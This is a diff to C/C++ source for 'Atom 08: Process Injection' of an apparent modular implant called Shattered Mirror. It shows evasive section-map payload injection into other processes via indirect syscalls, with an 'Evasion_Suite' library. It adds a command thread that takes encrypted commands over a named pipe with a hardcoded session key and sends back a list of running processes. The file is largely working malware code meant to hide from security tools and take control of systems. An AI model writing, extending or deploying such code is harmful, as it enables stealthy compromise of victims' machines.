@@ -1,4 +1,4 @@
-/*=============================================================================
+﻿/*=============================================================================
  * Shattered Mirror v1 — Atom 08: Process Injection
  *
  * Section-Based Map/View Injection Implementation.
@@ -14,9 +14,13 @@
 
 #include "Atom_08_Proc.h"
 #include "Atom_03_Sys.h" /* Syscall Linker */
+#include "../Orchestrator/AtomManager.h"
 #include "../Evasion_Suite/include/indirect_syscall.h"
 #include "../Evasion_Suite/include/common.h"
 #include <tlhelp32.h>
+#include <cstdio>
+#include <string>
+#include <cstring>
 
 /* Helper for finding process by DJB2 hash of the name */
 DWORD FindTargetProcess(DWORD dwProcNameHash) {
@@ -121,4 +125,50 @@ BOOL InjectPayloadSectionMap(DWORD dwTargetPid, const BYTE* pPayload, SIZE_T szP
     IndirectNtClose(hTargetProc);
 
     return NT_SUCCESS(status);
+}
+/*
+ * Process Information Reporting thread
+ */
+DWORD WINAPI ProcessAtomMain(LPVOID lpParam) {
+    DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
+    HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
+    if (!hPipe) return 1;
+
+    BYTE SharedSessionKey[] = "KI4ns1N2S1M8Tknp";
+
+    while (TRUE) {
+        IPC_MESSAGE inMsg = { 0 };
+        if (IPC_ReceiveMessage(hPipe, &inMsg, SharedSessionKey, 16)) {
+            if (inMsg.CommandId == CMD_EXECUTE) {
+                HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+                if (hSnapshot != INVALID_HANDLE_VALUE) {
+                    PROCESSENTRY32W pe;
+                    pe.dwSize = sizeof(PROCESSENTRY32W);
+
+                    std::string procReport = "[PROC_LIST]\n";
+                    if (Process32FirstW(hSnapshot, &pe)) {
+                        do {
+                            char line[512];
+                            sprintf_s(line, "PID: %6d | %ls\n", pe.th32ProcessID, pe.szExeFile);
+                            procReport += line;
+                            if (procReport.length() > 3800) break;
+                        } while (Process32NextW(hSnapshot, &pe));
+                    }
+                    CloseHandle(hSnapshot);
+
+                    IPC_MESSAGE outMsg = { 0 };
+                    outMsg.CommandId = CMD_REPORT;
+                    outMsg.dwPayloadLen = (DWORD)procReport.length();
+                    memcpy(outMsg.Payload, procReport.c_str(), outMsg.dwPayloadLen);
+
+                    IPC_SendMessage(hPipe, &outMsg, SharedSessionKey, 16);
+                }
+            }
+        } else if (GetLastError() == ERROR_BROKEN_PIPE) {
+            break;
+        }
+        Sleep(500);
+    }
+
+    return 0;
 }
